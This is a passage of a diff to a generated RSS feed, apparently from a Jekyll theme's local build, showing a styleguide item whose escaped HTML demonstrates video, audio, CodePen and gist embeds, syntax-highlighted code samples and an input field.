+&lt;iframe src=&quot;https://embed.ted.com/talks/ted_halstead_a_climate_solution_where_all_sides_can_win&quot; width=&quot;640&quot; height=&quot;360&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;twitch-responsive-embed&quot;&gt;Twitch Responsive Embed&lt;/h3&gt;
+
+&lt;iframe src=&quot;https://player.twitch.tv/?autoplay=false&amp;amp;video=v248755437&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;true&quot; scrolling=&quot;no&quot; height=&quot;378&quot; width=&quot;620&quot;&gt;&lt;/iframe&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;soundcloud-embed&quot;&gt;SoundCloud Embed&lt;/h3&gt;
+
+&lt;iframe width=&quot;100%&quot; height=&quot;166&quot; scrolling=&quot;no&quot; frameborder=&quot;no&quot; src=&quot;https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/29738591&amp;amp;color=ff5500&amp;amp;auto_play=false&amp;amp;hide_related=false&amp;amp;show_comments=true&amp;amp;show_user=true&amp;amp;show_reposts=false&quot;&gt;&lt;/iframe&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;codepen-embed&quot;&gt;CodePen Embed&lt;/h3&gt;
+
+&lt;p data-height=&quot;265&quot; data-theme-id=&quot;light&quot; data-slug-hash=&quot;YWvpRo&quot; data-default-tab=&quot;css,result&quot; data-user=&quot;kharrop&quot; data-embed-version=&quot;2&quot; data-pen-title=&quot;Referral Form&quot; class=&quot;codepen&quot;&gt;&lt;/p&gt;
+&lt;script async=&quot;&quot; src=&quot;https://production-assets.codepen.io/assets/embed/ei.js&quot;&gt;&lt;/script&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;syntax-highlighting&quot;&gt;Syntax Highlighting&lt;/h3&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;s1&quot;&gt;&apos;use strict&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;markdown&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;markdown&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;markdown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;preview&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;preview&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;markdown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toHTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;You can add inline code just like this, E.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;.code { color: #fff; }&lt;/code&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nt&quot;&gt;pre&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;#f4f4f4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;nl&quot;&gt;max-width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;100%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;nl&quot;&gt;overflow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;auto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;github-gist-embed&quot;&gt;GitHub gist Embed&lt;/h3&gt;
+
+&lt;script src=&quot;https://gist.github.com/ahmadajmi/dbb4f713317721668bcbc39420562afc.js&quot;&gt;&lt;/script&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;input-style&quot;&gt;Input Style&lt;/h3&gt;
+
+&lt;p&gt;&lt;input type=&quot;text&quot; placeholder=&quot;I&apos;m an input field!&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+
+</description>
+            <link>http://localhost:4000/styleguide/</link>
+          </item>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+
+  </channel>
+</rss>
